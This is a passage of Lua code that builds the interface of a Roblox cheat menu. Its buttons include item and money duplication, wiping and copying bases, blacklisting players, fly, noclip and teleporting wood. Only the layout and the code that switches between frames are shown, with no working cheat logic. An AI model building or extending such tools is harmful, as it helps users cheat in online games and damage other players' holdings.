CountAxes.Name = "CountAxes"
CountAxes.Parent = DupeFrame
CountAxes.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
CountAxes.BorderSizePixel = 0
CountAxes.Position = UDim2.new(0.675000012, 0, 0.754500031, 0)
CountAxes.Size = UDim2.new(0, 98, 0, 52)
CountAxes.Font = Enum.Font.SourceSans
CountAxes.Text = "Count Axes"
CountAxes.TextColor3 = Color3.fromRGB(255, 255, 255)
CountAxes.TextScaled = true
CountAxes.TextSize = 14.000
CountAxes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
CountAxes.TextWrapped = true

RestoreAxes.Name = "RestoreAxes"
RestoreAxes.Parent = DupeFrame
RestoreAxes.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
RestoreAxes.BorderSizePixel = 0
RestoreAxes.Position = UDim2.new(0.675000012, 0, 0.513000011, 0)
RestoreAxes.Size = UDim2.new(0, 98, 0, 52)
RestoreAxes.Font = Enum.Font.SourceSans
RestoreAxes.Text = "Restore Axes"
RestoreAxes.TextColor3 = Color3.fromRGB(255, 255, 255)
RestoreAxes.TextScaled = true
RestoreAxes.TextSize = 14.000
RestoreAxes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
RestoreAxes.TextWrapped = true

DupeSlot.Name = "DupeSlot"
DupeSlot.Parent = DupeFrame
DupeSlot.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
DupeSlot.BorderSizePixel = 0
DupeSlot.Position = UDim2.new(0.0199999809, 0, 0.266666681, 0)
DupeSlot.Size = UDim2.new(0, 98, 0, 52)
DupeSlot.Font = Enum.Font.SourceSans
DupeSlot.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DupeSlot.PlaceholderText = "Slot?"
DupeSlot.Text = ""
DupeSlot.TextColor3 = Color3.fromRGB(255, 255, 255)
DupeSlot.TextScaled = true
DupeSlot.TextSize = 14.000
DupeSlot.TextWrapped = true

MoneyDupeSlot.Name = "MoneyDupeSlot"
MoneyDupeSlot.Parent = DupeFrame
MoneyDupeSlot.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
MoneyDupeSlot.BorderSizePixel = 0
MoneyDupeSlot.Position = UDim2.new(0.347000003, 0, 0.26699999, 0)
MoneyDupeSlot.Size = UDim2.new(0, 98, 0, 52)
MoneyDupeSlot.Font = Enum.Font.SourceSans
MoneyDupeSlot.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
MoneyDupeSlot.PlaceholderText = "Slot?"
MoneyDupeSlot.Text = ""
MoneyDupeSlot.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyDupeSlot.TextScaled = true
MoneyDupeSlot.TextSize = 14.000
MoneyDupeSlot.TextWrapped = true

MoneyDupe.Name = "MoneyDupe"
MoneyDupe.Parent = DupeFrame
MoneyDupe.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
MoneyDupe.BorderSizePixel = 0
MoneyDupe.Position = UDim2.new(0.347000003, 0, 0.0250000004, 0)
MoneyDupe.Size = UDim2.new(0, 98, 0, 52)
MoneyDupe.Font = Enum.Font.SourceSans
MoneyDupe.Text = "Money Dupe"
MoneyDupe.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyDupe.TextScaled = true
MoneyDupe.TextSize = 14.000
MoneyDupe.TextWrapped = true

AxeDupe.Name = "AxeDupe"
AxeDupe.Parent = DupeFrame
AxeDupe.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
AxeDupe.BorderSizePixel = 0
AxeDupe.Position = UDim2.new(0.675000012, 0, 0.0250000004, 0)
AxeDupe.Size = UDim2.new(0, 98, 0, 52)
AxeDupe.Font = Enum.Font.SourceSans
AxeDupe.Text = "Axe Dupe"
AxeDupe.TextColor3 = Color3.fromRGB(255, 255, 255)
AxeDupe.TextScaled = true
AxeDupe.TextSize = 14.000
AxeDupe.TextWrapped = true

Dupe_2.Name = "Dupe"
Dupe_2.Parent = DupeFrame
Dupe_2.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Dupe_2.BorderSizePixel = 0
Dupe_2.Position = UDim2.new(0.0199999996, 0, 0.0250000004, 0)
Dupe_2.Size = UDim2.new(0, 98, 0, 52)
Dupe_2.Font = Enum.Font.SourceSans
Dupe_2.Text = "Dupe"
Dupe_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Dupe_2.TextScaled = true
Dupe_2.TextSize = 14.000
Dupe_2.TextWrapped = true

MoneyStep1.Name = "MoneyStep1"
MoneyStep1.Parent = DupeFrame
MoneyStep1.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
MoneyStep1.BorderSizePixel = 0
MoneyStep1.Position = UDim2.new(0.346875012, 0, 0.513000011, 0)
MoneyStep1.Size = UDim2.new(0, 98, 0, 52)
MoneyStep1.Font = Enum.Font.SourceSans
MoneyStep1.Text = "Step 1"
MoneyStep1.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyStep1.TextScaled = true
MoneyStep1.TextSize = 14.000
MoneyStep1.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
MoneyStep1.TextWrapped = true

MoneyStep2.Name = "MoneyStep2"
MoneyStep2.Parent = DupeFrame
MoneyStep2.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
MoneyStep2.BorderSizePixel = 0
MoneyStep2.Position = UDim2.new(0.347000003, 0, 0.754999995, 0)
MoneyStep2.Size = UDim2.new(0, 98, 0, 52)
MoneyStep2.Font = Enum.Font.SourceSans
MoneyStep2.Text = "Step 2"
MoneyStep2.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyStep2.TextScaled = true
MoneyStep2.TextSize = 14.000
MoneyStep2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
MoneyStep2.TextWrapped = true

DupeStep2.Name = "DupeStep2"
DupeStep2.Parent = DupeFrame
DupeStep2.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
DupeStep2.BorderSizePixel = 0
DupeStep2.Position = UDim2.new(0.0199999996, 0, 0.754999995, 0)
DupeStep2.Size = UDim2.new(0, 98, 0, 52)
DupeStep2.Font = Enum.Font.SourceSans
DupeStep2.Text = "Step 2"
DupeStep2.TextColor3 = Color3.fromRGB(255, 255, 255)
DupeStep2.TextScaled = true
DupeStep2.TextSize = 14.000
DupeStep2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
DupeStep2.TextWrapped = true

DupeStep1.Name = "DupeStep1"
DupeStep1.Parent = DupeFrame
DupeStep1.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
DupeStep1.BorderSizePixel = 0
DupeStep1.Position = UDim2.new(0.0199999996, 0, 0.513000011, 0)
DupeStep1.Size = UDim2.new(0, 98, 0, 52)
DupeStep1.Font = Enum.Font.SourceSans
DupeStep1.Text = "Step 1"
DupeStep1.TextColor3 = Color3.fromRGB(255, 255, 255)
DupeStep1.TextScaled = true
DupeStep1.TextSize = 14.000
DupeStep1.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
DupeStep1.TextWrapped = true

Main.Name = "Main"
Main.Parent = mainframe
Main.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Main.BorderColor3 = Color3.fromRGB(138, 43, 226)
Main.BorderSizePixel = 0
Main.Size = UDim2.new(0, 80, 0, 40)
Main.Font = Enum.Font.SourceSans
Main.Text = "Main"
Main.TextColor3 = Color3.fromRGB(255, 255, 255)
Main.TextScaled = true
Main.TextSize = 32.000
Main.TextWrapped = true
Main.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = false
HubFrame.Visible = false
MainFrame.Visible = true
PlotFrame.Visible = false
TPFrame.Visible = false
WoodFrame.Visible = false
end)

MainFrame.Name = "MainFrame"
MainFrame.Parent = Main
MainFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(1, 0, 1, 0)
MainFrame.Size = UDim2.new(0, 320, 0, 240)
MainFrame.Visible = false

Speed.Name = "Speed"
Speed.Parent = MainFrame
Speed.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Speed.BorderSizePixel = 0
Speed.Position = UDim2.new(0.0199999809, 0, 0.0250000004, 0)
Speed.Size = UDim2.new(0, 76, 0, 52)
Speed.Font = Enum.Font.SourceSans
Speed.Text = "Speed"
Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
Speed.TextScaled = true
Speed.TextSize = 14.000
Speed.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Speed.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = MainFrame
Fly.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Fly.BorderSizePixel = 0
Fly.Position = UDim2.new(0.0199999996, 0, 0.270000011, 0)
Fly.Size = UDim2.new(0, 73, 0, 52)
Fly.Font = Enum.Font.SourceSans
Fly.Text = "Fly"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextWrapped = true

GoldenAxe.Name = "GoldenAxe"
GoldenAxe.Parent = MainFrame
GoldenAxe.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
GoldenAxe.BorderSizePixel = 0
GoldenAxe.Position = UDim2.new(0.0199999996, 0, 0.757499993, 0)
GoldenAxe.Size = UDim2.new(0, 73, 0, 52)
GoldenAxe.Font = Enum.Font.SourceSans
GoldenAxe.Text = "Golden Axe"
GoldenAxe.TextColor3 = Color3.fromRGB(255, 255, 255)
GoldenAxe.TextScaled = true
GoldenAxe.TextSize = 14.000
GoldenAxe.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
GoldenAxe.TextWrapped = true

TP.Name = "TP"
TP.Parent = MainFrame
TP.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
TP.BorderSizePixel = 0
TP.Position = UDim2.new(0.0199999996, 0, 0.514999986, 0)
TP.Size = UDim2.new(0, 73, 0, 52)
TP.Font = Enum.Font.SourceSans
TP.Text = "CtrlClickTP"
TP.TextColor3 = Color3.fromRGB(255, 255, 255)
TP.TextScaled = true
TP.TextSize = 14.000
TP.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TP.TextWrapped = true

Paint.Name = "Paint"
Paint.Parent = MainFrame
Paint.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Paint.BorderSizePixel = 0
Paint.Position = UDim2.new(0.26699999, 0, 0.757000029, 0)
Paint.Size = UDim2.new(0, 73, 0, 52)
Paint.Font = Enum.Font.SourceSans
Paint.Text = "Paint"
Paint.TextColor3 = Color3.fromRGB(255, 255, 255)
Paint.TextScaled = true
Paint.TextSize = 14.000
Paint.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Paint.TextWrapped = true

AllBp.Name = "AllBp"
AllBp.Parent = MainFrame
AllBp.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
AllBp.BorderSizePixel = 0
AllBp.Position = UDim2.new(0.26699999, 0, 0.514999986, 0)
AllBp.Size = UDim2.new(0, 73, 0, 52)
AllBp.Font = Enum.Font.SourceSans
AllBp.Text = "All Bp's"
AllBp.TextColor3 = Color3.fromRGB(255, 255, 255)
AllBp.TextScaled = true
AllBp.TextSize = 14.000
AllBp.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
AllBp.TextWrapped = true

CarFlight.Name = "CarFlight"
CarFlight.Parent = MainFrame
CarFlight.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
CarFlight.BorderSizePixel = 0
CarFlight.Position = UDim2.new(0.266874999, 0, 0.269999981, 0)
CarFlight.Size = UDim2.new(0, 73, 0, 52)
CarFlight.Font = Enum.Font.SourceSans
CarFlight.Text = "Car Flight"
CarFlight.TextColor3 = Color3.fromRGB(255, 255, 255)
CarFlight.TextScaled = true
CarFlight.TextSize = 14.000
CarFlight.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
CarFlight.TextWrapped = true

NoFog.Name = "NoFog"
NoFog.Parent = MainFrame
NoFog.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
NoFog.BorderSizePixel = 0
NoFog.Position = UDim2.new(0.753000021, 0, 0.514999986, 0)
NoFog.Size = UDim2.new(0, 73, 0, 52)
NoFog.Font = Enum.Font.SourceSans
NoFog.Text = "No Fog"
NoFog.TextColor3 = Color3.fromRGB(255, 255, 255)
NoFog.TextScaled = true
NoFog.TextSize = 14.000
NoFog.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
NoFog.TextWrapped = true

ResetCharacter.Name = "ResetCharacter"
ResetCharacter.Parent = MainFrame
ResetCharacter.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
ResetCharacter.BorderSizePixel = 0
ResetCharacter.Position = UDim2.new(0.753000021, 0, 0.757000029, 0)
ResetCharacter.Size = UDim2.new(0, 73, 0, 52)
ResetCharacter.Font = Enum.Font.SourceSans
ResetCharacter.Text = "Reset Character"
ResetCharacter.TextColor3 = Color3.fromRGB(255, 255, 255)
ResetCharacter.TextScaled = true
ResetCharacter.TextSize = 14.000
ResetCharacter.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
ResetCharacter.TextWrapped = true

NoClip.Name = "NoClip"
NoClip.Parent = MainFrame
NoClip.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0.753000021, 0, 0.270000011, 0)
NoClip.Size = UDim2.new(0, 73, 0, 52)
NoClip.Font = Enum.Font.SourceSans
NoClip.Text = "No Clip"
NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextScaled = true
NoClip.TextSize = 14.000
NoClip.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextWrapped = true

InfJump.Name = "InfJump"
InfJump.Parent = MainFrame
InfJump.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
InfJump.BorderSizePixel = 0
InfJump.Position = UDim2.new(0.504999995, 0, 0.270000011, 0)
InfJump.Size = UDim2.new(0, 73, 0, 52)
InfJump.Font = Enum.Font.SourceSans
InfJump.Text = "Infinite Jump"
InfJump.TextColor3 = Color3.fromRGB(255, 255, 255)
InfJump.TextScaled = true
InfJump.TextSize = 14.000
InfJump.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
InfJump.TextWrapped = true

jesus.Name = "jesus"
jesus.Parent = MainFrame
jesus.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
jesus.BorderSizePixel = 0
jesus.Position = UDim2.new(0.504999995, 0, 0.514999986, 0)
jesus.Size = UDim2.new(0, 73, 0, 52)
jesus.Font = Enum.Font.SourceSans
jesus.Text = "Jesus"
jesus.TextColor3 = Color3.fromRGB(255, 255, 255)
jesus.TextScaled = true
jesus.TextSize = 14.000
jesus.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
jesus.TextWrapped = true

FastDelBps.Name = "FastDelBps"
FastDelBps.Parent = MainFrame
FastDelBps.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
FastDelBps.BorderSizePixel = 0
FastDelBps.Position = UDim2.new(0.504999995, 0, 0.757000029, 0)
FastDelBps.Size = UDim2.new(0, 73, 0, 52)
FastDelBps.Font = Enum.Font.SourceSans
FastDelBps.Text = "FastDelBps"
FastDelBps.TextColor3 = Color3.fromRGB(255, 255, 255)
FastDelBps.TextScaled = true
FastDelBps.TextSize = 14.000
FastDelBps.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
FastDelBps.TextWrapped = true

Jump.Name = "Jump"
Jump.Parent = MainFrame
Jump.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Jump.BorderSizePixel = 0
Jump.Position = UDim2.new(0.504999995, 0, 0.0250000004, 0)
Jump.Size = UDim2.new(0, 76, 0, 52)
Jump.Font = Enum.Font.SourceSans
Jump.Text = "Jump"
Jump.TextColor3 = Color3.fromRGB(255, 255, 255)
Jump.TextScaled = true
Jump.TextSize = 14.000
Jump.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Jump.TextWrapped = true

SpeedValue.Name = "SpeedValue"
SpeedValue.Parent = MainFrame
SpeedValue.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
SpeedValue.BorderSizePixel = 0
SpeedValue.Position = UDim2.new(0.257499993, 0, 0.0250000004, 0)
SpeedValue.Size = UDim2.new(0, 76, 0, 52)
SpeedValue.Font = Enum.Font.SourceSans
SpeedValue.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
SpeedValue.PlaceholderText = "16"
SpeedValue.Text = ""
SpeedValue.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedValue.TextScaled = true
SpeedValue.TextSize = 14.000
SpeedValue.TextWrapped = true

JumpValue.Name = "JumpValue"
JumpValue.Parent = MainFrame
JumpValue.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
JumpValue.BorderSizePixel = 0
JumpValue.Position = UDim2.new(0.742500007, 0, 0.0250000004, 0)
JumpValue.Size = UDim2.new(0, 76, 0, 52)
JumpValue.Font = Enum.Font.SourceSans
JumpValue.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
JumpValue.PlaceholderText = "50"
JumpValue.Text = ""
JumpValue.TextColor3 = Color3.fromRGB(255, 255, 255)
JumpValue.TextScaled = true
JumpValue.TextSize = 14.000
JumpValue.TextWrapped = true

SecretWalkSpeed.Name = "SecretWalkSpeed"
SecretWalkSpeed.Parent = MainFrame
SecretWalkSpeed.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
SecretWalkSpeed.BorderSizePixel = 0
SecretWalkSpeed.Size = UDim2.new(0, 6, 0, 6)
SecretWalkSpeed.AutoButtonColor = false
SecretWalkSpeed.Font = Enum.Font.SourceSans
SecretWalkSpeed.Text = ""
SecretWalkSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
SecretWalkSpeed.TextScaled = true
SecretWalkSpeed.TextSize = 14.000
SecretWalkSpeed.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SecretWalkSpeed.TextWrapped = true

Plot.Name = "Plot"
Plot.Parent = mainframe
Plot.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Plot.BorderColor3 = Color3.fromRGB(138, 43, 226)
Plot.BorderSizePixel = 0
Plot.Position = UDim2.new(0, 0, 0.572000027, 0)
Plot.Size = UDim2.new(0, 80, 0, 40)
Plot.Font = Enum.Font.SourceSans
Plot.Text = "Plot"
Plot.TextColor3 = Color3.fromRGB(255, 255, 255)
Plot.TextScaled = true
Plot.TextSize = 32.000
Plot.TextWrapped = true
Plot.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = false
HubFrame.Visible = false
MainFrame.Visible = false
PlotFrame.Visible = true
TPFrame.Visible = false
WoodFrame.Visible = false
end)

PlotFrame.Name = "PlotFrame"
PlotFrame.Parent = Plot
PlotFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
PlotFrame.BorderSizePixel = 0
PlotFrame.Position = UDim2.new(1, 0, -3.00299978, 0)
PlotFrame.Size = UDim2.new(0, 320, 0, 240)
PlotFrame.Visible = false

BlackListAll.Name = "BlackList All"
BlackListAll.Parent = PlotFrame
BlackListAll.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
BlackListAll.BorderSizePixel = 0
BlackListAll.Position = UDim2.new(0.0199999996, 0, 0.754999995, 0)
BlackListAll.Size = UDim2.new(0, 151, 0, 52)
BlackListAll.Font = Enum.Font.SourceSans
BlackListAll.Text = "Blacklist All"
BlackListAll.TextColor3 = Color3.fromRGB(255, 255, 255)
BlackListAll.TextScaled = true
BlackListAll.TextSize = 14.000
BlackListAll.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
BlackListAll.TextWrapped = true

MaxLand.Name = "MaxLand"
MaxLand.Parent = PlotFrame
MaxLand.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
MaxLand.BorderSizePixel = 0
MaxLand.Position = UDim2.new(0.0199999996, 0, 0.270000011, 0)
MaxLand.Size = UDim2.new(0, 151, 0, 52)
MaxLand.Font = Enum.Font.SourceSans
MaxLand.Text = "Max Land"
MaxLand.TextColor3 = Color3.fromRGB(255, 255, 255)
MaxLand.TextScaled = true
MaxLand.TextSize = 14.000
MaxLand.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
MaxLand.TextWrapped = true

WipeBase.Name = "WipeBase"
WipeBase.Parent = PlotFrame
WipeBase.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
WipeBase.BorderSizePixel = 0
WipeBase.Position = UDim2.new(0.0199999996, 0, 0.514999986, 0)
WipeBase.Size = UDim2.new(0, 151, 0, 52)
WipeBase.Font = Enum.Font.SourceSans
WipeBase.Text = "Wipe Base"
WipeBase.TextColor3 = Color3.fromRGB(255, 255, 255)
WipeBase.TextScaled = true
WipeBase.TextSize = 14.000
WipeBase.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
WipeBase.TextWrapped = true

AntiBLAll.Name = "AntiBLAll"
AntiBLAll.Parent = PlotFrame
AntiBLAll.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
AntiBLAll.BorderSizePixel = 0
AntiBLAll.Position = UDim2.new(0.508000016, 0, 0.754999995, 0)
AntiBLAll.Size = UDim2.new(0, 151, 0, 52)
AntiBLAll.Font = Enum.Font.SourceSans
AntiBLAll.Text = "Anti Blacklist All"
AntiBLAll.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiBLAll.TextScaled = true
AntiBLAll.TextSize = 14.000
AntiBLAll.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
AntiBLAll.TextWrapped = true

CopyBase.Name = "CopyBase"
CopyBase.Parent = PlotFrame
CopyBase.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
CopyBase.BorderSizePixel = 0
CopyBase.Position = UDim2.new(0.508000016, 0, 0.514999986, 0)
CopyBase.Size = UDim2.new(0, 151, 0, 52)
CopyBase.Font = Enum.Font.SourceSans
CopyBase.Text = "Copy Base"
CopyBase.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBase.TextScaled = true
CopyBase.TextSize = 14.000
CopyBase.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
CopyBase.TextWrapped = true

PlayerName.Name = "PlayerName"
PlayerName.Parent = PlotFrame
PlayerName.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
PlayerName.BorderSizePixel = 0
PlayerName.Position = UDim2.new(0.508000016, 0, 0.270000011, 0)
PlayerName.Size = UDim2.new(0, 151, 0, 52)
PlayerName.Font = Enum.Font.SourceSans
PlayerName.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.PlaceholderText = "Player Name?"
PlayerName.Text = ""
PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.TextScaled = true
PlayerName.TextSize = 14.000
PlayerName.TextWrapped = true

You.Name = "You"
You.Parent = PlotFrame
You.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
You.BorderSizePixel = 0
You.Position = UDim2.new(0.0199999996, 0, 0.0250000004, 0)
You.Size = UDim2.new(0, 151, 0, 52)
You.Font = Enum.Font.SourceSans
You.Text = "You"
You.TextColor3 = Color3.fromRGB(255, 255, 255)
You.TextScaled = true
You.TextSize = 14.000
You.TextWrapped = true

Others.Name = "Others"
Others.Parent = PlotFrame
Others.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Others.BorderSizePixel = 0
Others.Position = UDim2.new(0.508000016, 0, 0.0250000004, 0)
Others.Size = UDim2.new(0, 151, 0, 52)
Others.Font = Enum.Font.SourceSans
Others.Text = "Others"
Others.TextColor3 = Color3.fromRGB(255, 255, 255)
Others.TextScaled = true
Others.TextSize = 14.000
Others.TextWrapped = true

Wood.Name = "Wood"
Wood.Parent = mainframe
Wood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Wood.BorderColor3 = Color3.fromRGB(138, 43, 226)
Wood.BorderSizePixel = 0
Wood.Position = UDim2.new(0, 0, 0.143000007, 0)
Wood.Size = UDim2.new(0, 80, 0, 40)
Wood.Font = Enum.Font.SourceSans
Wood.Text = "Wood"
Wood.TextColor3 = Color3.fromRGB(255, 255, 255)
Wood.TextScaled = true
Wood.TextSize = 32.000
Wood.TextWrapped = true
Wood.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = false
HubFrame.Visible = false
MainFrame.Visible = false
PlotFrame.Visible = false
TPFrame.Visible = false
WoodFrame.Visible = true
end)

WoodFrame.Name = "WoodFrame"
WoodFrame.Parent = Wood
WoodFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
WoodFrame.BorderSizePixel = 0
WoodFrame.Position = UDim2.new(1, 0, -0.00100021367, 0)
WoodFrame.Size = UDim2.new(0, 320, 0, 240)
WoodFrame.Visible = false

SellWood.Name = "SellWood"
SellWood.Parent = WoodFrame
SellWood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
SellWood.BorderSizePixel = 0
SellWood.Position = UDim2.new(0.0199999809, 0, 0.0250000004, 0)
SellWood.Size = UDim2.new(0, 151, 0, 72)
SellWood.Font = Enum.Font.SourceSans
SellWood.Text = "Sell Wood"
SellWood.TextColor3 = Color3.fromRGB(255, 255, 255)
SellWood.TextScaled = true
SellWood.TextSize = 14.000
SellWood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SellWood.TextWrapped = true

SellPlanks.Name = "SellPlanks"
SellPlanks.Parent = WoodFrame
SellPlanks.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
SellPlanks.BorderSizePixel = 0
SellPlanks.Position = UDim2.new(0.508000016, 0, 0.0250000004, 0)
SellPlanks.Size = UDim2.new(0, 151, 0, 72)
SellPlanks.Font = Enum.Font.SourceSans
SellPlanks.Text = "Sell Planks"
SellPlanks.TextColor3 = Color3.fromRGB(255, 255, 255)
SellPlanks.TextScaled = true
SellPlanks.TextSize = 14.000
SellPlanks.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SellPlanks.TextWrapped = true

ModWood.Name = "ModWood"
ModWood.Parent = WoodFrame
ModWood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
ModWood.BorderSizePixel = 0
ModWood.Position = UDim2.new(0.0199999996, 0, 0.675000012, 0)
ModWood.Size = UDim2.new(0, 151, 0, 72)
ModWood.Font = Enum.Font.SourceSans
ModWood.Text = "Mod Wood"
ModWood.TextColor3 = Color3.fromRGB(255, 255, 255)
ModWood.TextScaled = true
ModWood.TextSize = 14.000
ModWood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
ModWood.TextWrapped = true

TPWood.Name = "TPWood"
TPWood.Parent = WoodFrame
TPWood.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
TPWood.BorderSizePixel = 0
TPWood.Position = UDim2.new(0.0199999996, 0, 0.350000024, 0)
TPWood.Size = UDim2.new(0, 151, 0, 72)
TPWood.Font = Enum.Font.SourceSans
TPWood.Text = "TP Wood"
TPWood.TextColor3 = Color3.fromRGB(255, 255, 255)
TPWood.TextScaled = true
TPWood.TextSize = 14.000
TPWood.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPWood.TextWrapped = true

TPPlanks.Name = "TPPlanks"
TPPlanks.Parent = WoodFrame
TPPlanks.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
TPPlanks.BorderSizePixel = 0
TPPlanks.Position = UDim2.new(0.508000016, 0, 0.349999994, 0)
TPPlanks.Size = UDim2.new(0, 151, 0, 72)
TPPlanks.Font = Enum.Font.SourceSans
TPPlanks.Text = "TP Planks"
TPPlanks.TextColor3 = Color3.fromRGB(255, 255, 255)
TPPlanks.TextScaled = true
TPPlanks.TextSize = 14.000
TPPlanks.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPPlanks.TextWrapped = true

RemoveTrees.Name = "RemoveTrees"
RemoveTrees.Parent = WoodFrame
RemoveTrees.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
RemoveTrees.BorderSizePixel = 0
RemoveTrees.Position = UDim2.new(0.508000016, 0, 0.675000012, 0)
RemoveTrees.Size = UDim2.new(0, 151, 0, 72)
RemoveTrees.Font = Enum.Font.SourceSans
RemoveTrees.Text = "Remove Trees"
RemoveTrees.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoveTrees.TextScaled = true
RemoveTrees.TextSize = 14.000
RemoveTrees.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
RemoveTrees.TextWrapped = true

TP_2.Name = "TP"
TP_2.Parent = mainframe
TP_2.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
TP_2.BorderColor3 = Color3.fromRGB(138, 43, 226)
TP_2.BorderSizePixel = 0
TP_2.Position = UDim2.new(0, 0, 0.286000013, 0)
TP_2.Size = UDim2.new(0, 80, 0, 40)
TP_2.Font = Enum.Font.SourceSans
TP_2.Text = "TP"
TP_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TP_2.TextScaled = true
TP_2.TextSize = 32.000
TP_2.TextWrapped = true
TP_2.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = false
HubFrame.Visible = false
MainFrame.Visible = false
PlotFrame.Visible = false
TPFrame.Visible = true
WoodFrame.Visible = false
end)

TPFrame.Name = "TPFrame"
TPFrame.Parent = TP_2
TPFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
TPFrame.BorderSizePixel = 0
TPFrame.Position = UDim2.new(1, 0, -1.00200045, 0)
TPFrame.Size = UDim2.new(0, 320, 0, 240)
TPFrame.Visible = false

StoreWoodRUs.Name = "StoreWoodRUs"
StoreWoodRUs.Parent = TPFrame
StoreWoodRUs.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreWoodRUs.BorderSizePixel = 0
StoreWoodRUs.Position = UDim2.new(0.0199999809, 0, 0.0250000004, 0)
